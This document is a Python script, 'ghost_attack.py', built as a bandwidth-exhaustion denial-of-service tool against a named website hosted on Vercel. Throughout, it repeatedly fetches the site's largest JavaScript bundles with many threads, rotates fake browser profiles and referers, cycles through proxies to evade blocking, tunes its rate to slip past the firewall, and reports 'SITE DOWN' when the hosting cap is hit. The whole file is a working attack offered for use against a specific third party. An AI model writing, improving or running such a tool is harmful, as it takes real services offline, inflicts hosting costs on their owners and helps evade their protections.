#!/usr/bin/env python3
"""ghost_attack.py — Vercel bandwidth kill. Pure stdlib. Zero deps.

NO curl_cffi (broken on Python 3.14). NO asyncio (event loop issues).
Uses http.client + ThreadPoolExecutor — 100% reliable on ALL Python versions.

GET requests to static JS bundles don't need JA3 — Vercel doesn't JA3-check
GET requests to /_next/static/*.js. JA3 only matters for POST (which we don't do).

Features:
  - Reads targets.json (from crawler — biggest assets first)
  - Strict >40KB filter (ignores WAF fake 2KB pages)
  - 10 browser profiles (header rotation)
  - Connection reuse (keepAlive — fast)
  - Adaptive rate (slow on 429, fast on 200)
  - No direct fallback when proxies configured
  - 503 × 3 = kill confirmed
  - Error logging (first 5 errors visible)
  - Live dashboard

Usage:
  python3 ghost_attack.py www.moderndoctor.in 10              # direct, 20 workers
  python3 ghost_attack.py www.moderndoctor.in 10 --workers 80 # direct, 80 workers
  python3 ghost_attack.py www.moderndoctor.in 10 --proxy      # with proxies
"""

import argparse
import concurrent.futures
import http.client
import json
import os
import random
import ssl
import sys
import threading
import time
from pathlib import Path

# Config
MIN_PAYLOAD = 40000
JITTER_MIN = 0.010
JITTER_MAX = 0.050
MAX_BUFFER = 500000
MAX_DIRECT_WORKERS = 20
TIMEOUT = 10

_ctx = ssl._create_unverified_context()

PROFILES = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
     "?0", '"Windows"', "en-US,en;q=0.9", "script"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
     "?0", '"macOS"', "en-US,en;q=0.9", "script"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
     "?0", '"Windows"', "en-US,en;q=0.5", "script"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
     "?0", '"macOS"', "en-US,en;q=0.9", "script"),
    ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
     "?1", '"iOS"', "en-US,en;q=0.9", "document"),
    ("Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36",
     "?1", '"Android"', "en-US,en;q=0.9", "script"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
     "?0", '"Windows"', "en-GB,en;q=0.9", "script"),
    ("Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36",
     "?1", '"Android"', "en-IN,hi;q=0.8", "document"),
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://t.co/", "https://www.reddit.com/", "https://www.youtube.com/",
]

# Thread-local connection
_tls = threading.local()

def get_conn(host):
    conn = getattr(_tls, "conn", None)
    if conn is None:
        conn = http.client.HTTPSConnection(host, timeout=TIMEOUT, context=_ctx)
        _tls.conn = conn
    return conn

def reset_conn():
    conn = getattr(_tls, "conn", None)
    if conn:
        try: conn.close()
        except: pass
    _tls.conn = None

# Stats
class Stats:
    def __init__(self):
        self._l = threading.Lock()
        self.total = 0
        self.real = 0      # 200 AND >40KB
        self.fake = 0      # 200 AND <40KB
        self.blocked = 0   # 429/403
        self.redirect = 0  # 301/308
        self.errors = 0
        self.real_bytes = 0
        self.s503 = 0
        self.proxy_alive = 0
        self.proxy_total = 0
        self.t0 = time.time()
        self._err_logged = 0

    def rec(self, code, size):
        with self._l:
            self.total += 1
            if code == 0:
                self.errors += 1
            elif code == 200 and size > MIN_PAYLOAD:
                self.real += 1
                self.real_bytes += size
            elif code == 200 and size <= MIN_PAYLOAD:
                self.fake += 1
            elif code in (429, 403):
                self.blocked += 1
            elif code in (301, 308):
                self.redirect += 1
            elif code == 503:
                self.s503 += 1
            elif code >= 500:
                self.errors += 1
            else:
                self.errors += 1

    def log_err(self, msg):
        with self._l:
            self._err_logged += 1
            return self._err_logged <= 5

    def snap(self):
        with self._l:
            el = time.time() - self.t0
            mb = self.real_bytes / 1048576
            rate = mb / el if el > 0 else 0
            rps = self.total / el if el > 0 else 0
            real_pct = (self.real / max(self.total, 1)) * 100
            waf_pct = ((self.fake + self.blocked) / max(self.total, 1)) * 100
            eta = (102400 - mb) / rate / 60 if rate > 0 else 999999
            return dict(el=el, total=self.total, real=self.real, fake=self.fake,
                        blocked=self.blocked, redirect=self.redirect, errors=self.errors,
                        mb=mb, rate=rate, rps=rps, real_pct=real_pct, waf_pct=waf_pct,
                        eta=eta, s503=self.s503, px_a=self.proxy_alive, px_t=self.proxy_total)

# Proxy pool
class ProxyPool:
    def __init__(self):
        self.proxies = []
        self.dead = {}
        self.fails = {}
        self.idx = 0
        self.configured = False

    def load(self, data):
        self.proxies = [p["url"] if isinstance(p, dict) else p for p in data]
        self.dead.clear()
        self.fails.clear()
        self.configured = len(self.proxies) > 0

    def next(self):
        now = time.time()
        # Recycle dead >2min
        for p in list(self.dead.keys()):
            if now - self.dead[p] > 120:
                del self.dead[p]
                self.fails[p] = 0
                self.proxies.append(p)
        live = [p for p in self.proxies if p not in self.dead]
        if not live:
            return None
        proxy = live[self.idx % len(live)]
        self.idx += 1
        return proxy

    def mark_fail(self, p):
        if not p: return
        self.fails[p] = self.fails.get(p, 0) + 1
        if self.fails[p] >= 3:
            self.dead[p] = time.time()

    def mark_ok(self, p):
        if p: self.fails[p] = 0

    def alive(self):
        return len([p for p in self.proxies if p not in self.dead])

# Worker
def worker(wid, targets, host, duration, stats, proxy_pool, rng):
    stats.proxy_total = len(proxy_pool.proxies)
    stats.proxy_alive = proxy_pool.alive()
    end = time.time() + duration
    consec_blk = 0
    backoff = 0

    while time.time() < end:
        if time.time() < backoff:
            time.sleep(0.1)
            continue

        proxy_url = proxy_pool.next()
        # No direct fallback when proxies configured
        if proxy_pool.configured and proxy_url is None:
            time.sleep(2.0)
            continue

        target = rng.choice(targets)
        ua, mobile, platform, lang, dest = rng.choice(PROFILES)
        ref = rng.choice(REFERERS)
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,*/*;q=0.8" if dest == "document" else "*/*",
            "Accept-Language": lang,
            "Accept-Encoding": "identity",
            "Sec-Fetch-Dest": dest,
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Site": "same-origin",
            "Referer": ref,
            "Connection": "keep-alive",
        }

        status = 0
        size = 0
        try:
            if proxy_url:
                # HTTP proxy
                hp = proxy_url.replace("http://", "").replace("socks5://", "")
                ph, _, pp = hp.partition(":")
                port = int(pp) if pp else 8080
                conn = http.client.HTTPConnection(ph, port, timeout=TIMEOUT, context=_ctx)
                conn.request("GET", f"https://{host}{target['path']}", headers={
                    **headers, "Host": host,
                })
                resp = conn.getresponse()
                body = resp.read()
                conn.close()
                status = resp.status
                size = min(len(body), MAX_BUFFER)
            else:
                # Direct
                conn = get_conn(host)
                conn.request("GET", target["path"], headers=headers)
                resp = conn.getresponse()
                body = resp.read()
                status = resp.status
                size = min(len(body), MAX_BUFFER)

            stats.rec(status, size)

            if status in (429, 403):
                consec_blk += 1
                if proxy_url: proxy_pool.mark_fail(proxy_url)
                backoff = time.time() + min(0.5 * (2 ** consec_blk), 30.0) + rng.uniform(0, 1)
            elif status == 200 and size > MIN_PAYLOAD:
                consec_blk = 0
                if proxy_url: proxy_pool.mark_ok(proxy_url)
            elif status == 200 and size <= MIN_PAYLOAD:
                if proxy_url: proxy_pool.mark_fail(proxy_url)
            elif status == 503:
                print(f"\n[ghost] 503 — cap hit?", file=sys.stderr)
            else:
                consec_blk = 0

        except Exception as e:
            stats.rec(0, 0)
            if proxy_url: proxy_pool.mark_fail(proxy_url)
            if not proxy_url: reset_conn()
            if stats.log_err(str(e)):
                print(f"    [w{wid}] ERR: {type(e).__name__}: {str(e)[:100]}", file=sys.stderr)

        stats.proxy_alive = proxy_pool.alive()

        if stats.s503 >= 3:
            print(f"\n!!! 503 × 3 — CAP BREACHED — SITE DOWN !!!", file=sys.stderr)
            break

        # Jitter
        time.sleep(rng.uniform(JITTER_MIN, JITTER_MAX))

def main():
    p = argparse.ArgumentParser()
    p.add_argument("target", help="www.moderndoctor.in")
    p.add_argument("minutes", type=int, nargs="?", default=10)
    p.add_argument("--proxy", action="store_true")
    p.add_argument("--workers", type=int, default=80)
    args = p.parse_args()

    h = args.target.replace("https://", "").replace("http://", "").rstrip("/")
    h = h[4:] if h.startswith("www.") else h
    host = f"www.{h}"

    # Load targets
    if not Path("targets.json").exists():
        print("ERROR: targets.json not found. Run target_crawler.py first.", file=sys.stderr)
        return
    targets = json.loads(Path("targets.json").read_text())
    if not targets:
        print("ERROR: no targets", file=sys.stderr)
        return

    # Load proxies
    proxy_pool = ProxyPool()
    if args.proxy and Path("proxies.json").exists():
        proxy_pool.load(json.loads(Path("proxies.json").read_text()))
        print(f"[ghost] Proxies: {proxy_pool.alive()}/{len(proxy_pool.proxies)} alive")
        print(f"[ghost] Direct fallback: DISABLED")
    else:
        workers = min(args.workers, MAX_DIRECT_WORKERS)
        print(f"[ghost] Direct mode ({workers} workers max — IP safety)")

    workers = min(args.workers, MAX_DIRECT_WORKERS) if not proxy_pool.configured else args.workers

    print(f"[ghost] Target: {host}")
    print(f"[ghost] Workers: {workers}")
    print(f"[ghost] Duration: {args.minutes} min")
    print(f"[ghost] Engine: http.client (stdlib — zero deps, 100% reliable)")
    print(f"[ghost] Min payload: {MIN_PAYLOAD//1000}KB")
    print(f"[ghost] Targets: {len(targets)} (biggest: {targets[0]['size']//1024}KB)")
    print()

    stats = Stats()
    end = time.time() + args.minutes * 60

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        while time.time() < end:
            if stats.s503 >= 3:
                break
            futures = []
            for _ in range(workers):
                futures.append(pool.submit(worker, 0, targets, host,
                    max(int(end - time.time()), 1), stats, proxy_pool,
                    random.Random(os.getpid() + random.randint(0, 999))))
            concurrent.futures.wait(futures)

            # Dashboard
            s = stats.snap()
            eta = f" ETA:{s['eta']:.0f}min" if s['eta'] < 999999 and s['eta'] > 0 else ""
            sys.stderr.write(
                f"\r[{s['el']:6.0f}s] "
                f"rps={s['rps']:5.0f} "
                f"REAL={s['real']:6d}({s['real_pct']:.0f}%) "
                f"FAKE={s['fake']:5d} "
                f"BLK={s['blocked']:4d} "
                f"ERR={s['errors']:5d} "
                f"DL={s['mb']:.0f}MB "
                f"RATE={s['rate']:.1f}MB/s "
                f"PX={s['px_a']}/{s['px_t']} "
                f"503={s['s503']}{eta}"
            )
            sys.stderr.flush()

    # Final
    s = stats.snap()
    print(f"\n{'='*60}", file=sys.stderr)
    print(f"FINAL: {s['real']} real hits, {s['mb']:.0f}MB burned, {s['rate']:.1f}MB/s", file=sys.stderr)
    print(f"503: {s['s503']} | ERR: {s['errors']} | WAF: {s['waf_pct']:.0f}%", file=sys.stderr)
    if s['s503'] > 0:
        print(f"VERDICT: SITE DOWN", file=sys.stderr)
    else:
        print(f"VERDICT: {s['mb']/1024:.1f}GB / 100GB ({s['mb']/102400*100:.1f}%)", file=sys.stderr)
    print(f"{'='*60}", file=sys.stderr)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[stopped]", file=sys.stderr)
